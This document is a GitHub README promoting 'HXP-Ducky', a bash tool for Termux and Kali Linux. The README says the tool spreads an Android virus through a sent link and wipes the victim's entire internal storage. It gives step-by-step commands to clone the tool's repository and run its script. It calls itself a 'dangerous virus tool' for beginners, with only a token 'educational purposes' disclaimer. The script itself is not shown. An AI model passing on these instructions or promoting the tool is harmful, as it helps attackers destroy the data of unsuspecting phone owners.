# HXP-Ducky
# Android Crash 

![PicsArt_06-09-02 32 04](https://user-images.githubusercontent.com/70594016/173282909-c48ed2bf-0417-49fc-a6a8-1b052ade0088.jpg)



###### HXP-DUCKY Android Crash Tool.
***

### <p align="center">Commands to run tool in ur terminal
***

```bash
Note : Tool is Made of Educational Purposes only.
       Please try not to harm anyone device 
       it's For Fun Purpose Not For Revenge
       (Join Us All https://bit.ly/3PV3S3r)
       
```
  
## About HXP-DUCKY
 
HXP-Ducky is a bash based script which is officially made for termux users and from this tool you can spread android virus by just sending link. This tool works on both rooted Android device and Non-rooted Android device. Warning vertical_traffic_light This Virus Formates (Deletes) Full Internal Storage So think and Use.
  
  
## Features 
* [+] Dangerous virus tool !
* [+] Updated maintainence !
* [+] Easy for beginners !
* [+] Working virus tool for termux && linux !

## The Tool is for

•Kali Linux

•Termux

## Language is used to Make this tool

•Bash Script
 
 ### <p align="center">Commands to run tool in ur Termux
***
        
 ```bash
pkg update && pkg upgrade -y
```
```bash
pkg install git -y
```
```bash
pkg install lolcat
```
```bash
git clone https://github.com/hackerxphantom/HXP-DUCKY
```
```bash
cd $HOME
```
```bash
cd HXP-DUCKY
```
```bash
ls
```
```bash
bash hxp_ducky.sh
```

## Tutorial :-
 https://youtu.be/p2gIHuGW5nc

### <p align="center">Commands to run tool in ur Kali Linux
***
 ```bash
sudo apt-get update && pkg upgrade -y
```
```bash
sudo apt-get install git -y
```
```bash
git clone https://github.com/hackerxphantom/HXP-DUCKY
```
```bash
cd HXP-DUCKY
```
```bash
bash hxp_ducky.sh
```

## ScreenShots :- 
  ![Screenshot_20220613-103741_zoom](https://user-images.githubusercontent.com/70594016/173283913-54b6a34b-e3e8-4d9e-a906-56dc08ffc44e.png)

 ## CONNECT WITH US :


[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](hInstagrinstagram.com/hacker.xphantom)
[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://hackerxphantom.blogspot.com)
[![Instagram](https://img.shields.io/badge/FACEBOOK-LIKE-red?style=for-the-badge&logo=facebook)](#)
[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://t.me/x_PH4N7OM)
[![Instagram](https://img.shields.io/badge/WHATSAPP-JOINGROUP-red?style=for-the-badge&logo=whatsapp)](https://bit.ly/3PV3S3r)
<a href="https://youtube.com/channel/UC4zER3G-oY5ChQit_Ag977w"><img title="YouTube" src="https://img.shields.io/badge/YouTube-Hacker X Phantom-red?style=for-the-badge&logo=Youtube"></a>


  
